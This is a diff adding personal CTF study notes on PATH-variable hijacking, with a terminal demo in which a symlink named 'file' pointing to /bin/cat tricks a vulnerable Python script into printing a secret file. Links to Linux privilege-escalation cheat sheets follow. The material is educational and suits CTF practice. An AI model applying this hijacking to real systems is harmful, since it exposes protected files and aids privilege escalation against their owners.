@@ -1,0 +1,77 @@
+
+		useful OS stuff for CTF's 
+
+ENVIRONMENT EXPLOITATION:
+
+if a program ever has a line something like os.system("ls") in python or exec() in php, basically any equivalent function that executes a shel command without a full path we can trick it into executing a different program.
+
+for example:
+
+you have a compiled program that allows you to ls files but not see their contents, and it does this with
+
+	exec("ls " + file)
+
+this is actually different from 
+
+	exec("/bin/ls " + file)
+
+and vulnerable. when you pass "ls" to a shell the os looks through places it expects to find programs and looks for something called "ls". Now if we can control where the os looks we can cause this to execute a program called "ls" but which is not "/bin/ls".
+this is done with the $ path variable. typing
+
+	echo $PATH
+
+will output to a console the directories the os is curently looking for programs. you can set an environment variable with:
+
+	PATH=/tmp/mydir/ 
+
+or add to the existing one (this is really useful with path, because it should be a list of all the places programs should appear). Now we need to have something called "ls" that does something we want it to in /tmp/mydir/
+This could be our own c program, or we could make a symbolic link.
+
+	ln -sf /bin/cat file
+
+this makes a link called file in the current directory which actually executes /bin/cat
+however if we call file we still get the normal behaviour of file
+whereas if we execute ./file we get the behaviour of cat. So now we add /tmp/mydir to the path variable.
+now when we call file the os first looks in /tmp/mydir, sees our symlink called file and executes it.
+we have now changed the "file" command to execute cat instead, viewing a file information now reveals the contents, here is a demo:
+
+	:/tmp/mydir$ ls
+		vulnerable.py
+
+	:/tmp/mydir$ echo "secret stuff" > secret.txt
+
+	:/tmp/mydir$ python vulnerable.py 
+		enter file to examine
+		secret.txt
+		secret.txt: ASCII text
+
+	:/tmp/mydir$ ln -sf /bin/cat file
+
+	:/tmp/mydir$ echo $PATH
+		/home/james/bin:/home/james/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+	:/tmp/mydir$ PATH=/tmp/mydir/:$PATH
+
+	:/tmp/mydir$ python vulnerable.py
+		enter file to examine
+		secret.txt
+		secret stuff
+
+ta-da! we have now tricked a program that could only display file info into giving us the secret text!
+
+here are some links explaining more what it does / how to use the PATH variable (for legitimate use):
+http://www.linfo.org/path_env_var.html
+https://unix.stackexchange.com/questions/26047/how-to-correctly-add-a-path-to-path
+
+
+Useful Links:
+
+g0tmi1lks privesc stuff:
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+another cheatsheet (more readable):
+https://www.rebootuser.com/?p=1623
+
+linux ACL stuff:
+https://doc.opensuse.org/documentation/leap/security/html/book.security/cha.security.acls.html
+
